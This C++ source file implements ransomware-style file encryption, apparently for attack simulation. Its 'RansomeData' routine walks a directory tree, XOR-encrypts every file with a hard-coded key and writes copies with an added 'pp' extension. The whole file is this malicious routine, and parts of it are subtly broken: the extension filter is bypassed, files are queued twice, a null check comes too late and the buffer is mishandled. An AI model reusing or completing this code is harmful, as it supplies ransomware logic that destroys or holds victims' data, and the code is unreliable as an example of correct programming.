#include "data_encrypted_for_impact.h"
#include "file_util.h"




namespace win {
	using namespace util;

	bool EncryptData::EncryptXOR(char* buffer, size_t buffer_length, char key){
		for (size_t i = 0; i < buffer_length; i++) {
			buffer[i] = buffer[i] ^ key;
		}

		if (buffer == nullptr)
			return false;

		return true;
	}

	bool DataEncryptedforImpact::SetRansomExtension(std::vector<std::wstring>* ext_list)
	{
		ext_List_.insert(ext_List_.end(), ext_list->begin(), ext_list->end());
		return true;
	}

	void DataEncryptedforImpact::RansomeData(std::wstring_view target_path)
	{
		std::vector<std::wstring> txtFiles;
		GetFileList(target_path, &txtFiles);

		for (const auto& file : txtFiles) {
			EncryptFileData(file);
		}

	}

	std::wstring DataEncryptedforImpact::ChangeFilenameExtensionForEncrypt(std::wstring_view target_file_path){
		std::wstring new_path(target_file_path);
		std::wstring ransome_extension = L"pp";

		new_path += ransome_extension.c_str();

		return new_path;
	}

	DWORD DataEncryptedforImpact::EncryptFileData(std::wstring_view target_file_path){
		char key = 0x6;
		DWORD buffer_size = 0;
		HANDLE target_file_handle = nullptr;
		HANDLE encrypt_file_handle = nullptr;
		LPVOID buffer = nullptr;
		std::wstring encrypt_file_path;
		std::wstring encrypt_buffer;
		EncryptData ed;

		DWORD status = OpenDataFile(&target_file_handle, target_file_path);
		if (status != ERROR_SUCCESS)
			return status;
		status = ReadData(target_file_handle, &buffer, &buffer_size);

		ed.EncryptXOR(reinterpret_cast<char*>(buffer), buffer_size, key);

		encrypt_file_path = ChangeFilenameExtensionForEncrypt(target_file_path);

		status = CreateDataFile(&encrypt_file_handle, encrypt_file_path);
		if (status != ERROR_SUCCESS)
			return status;

		encrypt_buffer = reinterpret_cast<wchar_t*>(buffer);
		status = WriteData(encrypt_file_handle, encrypt_buffer, static_cast<DWORD>(encrypt_buffer.length()));
		if (status != ERROR_SUCCESS)
			return status;

		return ERROR_SUCCESS;
	}

	std::wstring DataEncryptedforImpact::GetExtension(const std::wstring& file_name) {
		size_t pos = file_name.find_last_of(L'.');
		if (pos == std::wstring::npos) {
			return L"";
		}
		return file_name.substr(pos + 1);
	}

	//Shlwapi.h
	std::wstring DataEncryptedforImpact::GetExtension2(const std::wstring& file_name) {
		const wchar_t* extension = ::PathFindExtensionW(file_name.c_str());
		if (extension == nullptr || *extension == L'\0') {
			return L"";
		}
		return std::wstring(extension + 1);
	}

	bool DataEncryptedforImpact::CheckFileExtension(const std::wstring& file_name, const std::vector<std::wstring>& extension_list){
		static const std::unordered_set<std::wstring> lookupTable(extension_list.begin(), extension_list.end());
		return lookupTable.find(file_name) != lookupTable.end();
	}

	DWORD DataEncryptedforImpact::GetFileList(std::wstring_view path, std::vector<std::wstring>* text_files){
		WIN32_FIND_DATA find_data;
		HANDLE file_handle;

		std::wstring origin_path = std::wstring(path);
		std::wstring search_path = origin_path + L"\\*";

		file_handle = ::FindFirstFileW((LPCWSTR)search_path.c_str(), &find_data);
		if (file_handle != INVALID_HANDLE_VALUE) {
			do {
				std::wstring file_name = find_data.cFileName;

				if (file_name == L"." || file_name == L"..") {
					continue;
				}

				if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
					GetFileList(origin_path + L"\\" + file_name, text_files);
				}
				else {
					text_files->push_back(origin_path + L"\\" + file_name);
					if (CheckFileExtension(GetExtension(file_name), ext_List_)) {
						text_files->push_back(origin_path + L"\\" + file_name);;
					}
				}
			} while (::FindNextFileW(file_handle, &find_data) != 0);
			::FindClose(file_handle);
		}
		else
		{
			return ::GetLastError();
		}

		return ERROR_SUCCESS;
	}
} //namespace win
